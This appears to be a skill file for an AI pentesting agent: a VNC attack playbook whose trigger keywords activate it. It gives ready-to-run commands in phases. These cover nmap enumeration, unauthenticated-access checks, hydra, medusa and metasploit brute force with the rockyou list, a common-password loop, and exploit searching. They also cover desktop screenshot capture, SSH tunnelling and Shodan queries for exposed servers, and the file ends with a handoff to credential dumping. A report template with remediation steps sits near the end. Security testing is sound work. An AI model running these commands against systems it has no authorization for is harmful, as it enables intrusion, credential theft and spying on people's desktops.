---
name: proto-vnc
description: "VNC (Virtual Network Computing) enumeration and exploitation. No-auth check, VNC brute force, CVE-2006-2369 auth bypass, screenshot capture, LibVNCServer CVEs, SSH tunnel access. Triggers: 'vnc', 'rfb protocol', 'vnc exploit', 'vnc brute', 'vnc no auth', 'virtual network computing', 'vnc pentest', 'vnc screenshot', 'vnc vulnerability'."
---

# VNC Penetration Testing

Enumerate → check no-auth → brute force → exploit CVE → capture screenshot.

---

## Phase 1: Discovery & Enumeration

```bash
TARGET_IP="192.168.1.100"

nmap -sV -p 5900-5910 $TARGET_IP

nmap -sV --script vnc-info,vnc-brute,vnc-title -p 5900-5910 $TARGET_IP

nmap --script vnc-info -p 5900 $TARGET_IP

# 0 = None (immediately vulnerable)
# 1 = VNC Password
# 16 = Tight
# 18 = TLS
# 19 = VeNCrypt (TLS-wrapped)

nmap -sV -p 5900 --version-intensity 9 $TARGET_IP
```

---

## Phase 2: No-Auth Check

```bash
TARGET_IP="192.168.1.100"

nmap --script vnc-info -p 5900 $TARGET_IP | grep "Security types"
# "None" in Security types = unauthenticated access

vncviewer $TARGET_IP:5900

vncsnapshot -passwd /dev/null $TARGET_IP:0 vnc_screenshot.jpg
```

---

## Phase 3: Brute Force

```bash
TARGET_IP="192.168.1.100"

hydra -P /usr/share/wordlists/rockyou.txt vnc://$TARGET_IP -t 4
hydra -P /usr/share/wordlists/rockyou.txt -s 5901 vnc://$TARGET_IP -t 4

medusa -h $TARGET_IP -p 5900 -P /usr/share/wordlists/rockyou.txt -M vnc

msfconsole -q -x "
  use auxiliary/scanner/vnc/vnc_login;
  set RHOSTS $TARGET_IP;
  set PASS_FILE /usr/share/wordlists/rockyou.txt;
  run
"

COMMON_PASSES=("" "vnc" "password" "123456" "admin" "root" "secret" "letmein")
for pass in "${COMMON_PASSES[@]}"; do
  timeout 3 vncviewer -passwd <(echo "$pass") $TARGET_IP:5900 2>/dev/null \
    && echo "Password found: '$pass'" && break
done
```

---

## Phase 4: CVE Exploitation

```bash
TARGET_IP="192.168.1.100"

msfconsole -q -x "
  use auxiliary/scanner/vnc/vnc_none_auth;
  set RHOSTS $TARGET_IP;
  run
"

searchsploit libvncserver
searchsploit vnc | grep -iE "bypass|overflow|rce"

nmap --script vnc-info -p 5900 $TARGET_IP

nuclei -t network/cves/ -u $TARGET_IP:5900
```

---

## Phase 5: Screenshot & Access

```bash
TARGET_IP="192.168.1.100"
PASSWORD="discovered_password"

vncsnapshot -passwd <(echo "$PASSWORD") $TARGET_IP:0 screenshot.jpg

vncviewer $TARGET_IP::5900

ssh -L 5901:127.0.0.1:5900 user@$TARGET_IP -N -f
vncviewer 127.0.0.1:5901

```

---

## Phase 6: Shodan Discovery

```
port:5900 "RFB 003.008"
product:"VNC"
port:5900 "authentication disabled"

protocol="rfb"
```

---

## Report Template

```markdown
## VNC Security Assessment

**Port:** 5900/tcp (VNC/RFB)
**Auth Type:** [None | VNC Password | NLA/TLS]

### Findings
| Issue | Severity |
|:------|:--------:|
| No authentication required | Critical |
| Weak VNC password (brute-forced) | High |
| Unencrypted VNC traffic | Medium |
| RealVNC 4.1.1 auth bypass CVE-2006-2369 | Critical |

**Impact:** Full unauthenticated desktop access enables data theft,
credential capture, malware deployment, and lateral movement.

### Recommendations
1. Require strong authentication (NLA or VeNCrypt/TLS)
2. Restrict VNC to localhost — require SSH tunnel for remote access
3. Use strong password (>12 chars, unique)
4. Firewall port 5900 from public internet
5. Update VNC server software to current version
```

---

## Output

Save to `.omop/engagement/proto/vnc/`:
- `screenshot.jpg` — captured desktop screenshot
- `credentials.txt` — discovered credentials
- `enum.txt` — VNC service info

## Next Phase

→ `post-credential-dumping` if desktop accessed
→ `pentest-report` for final report
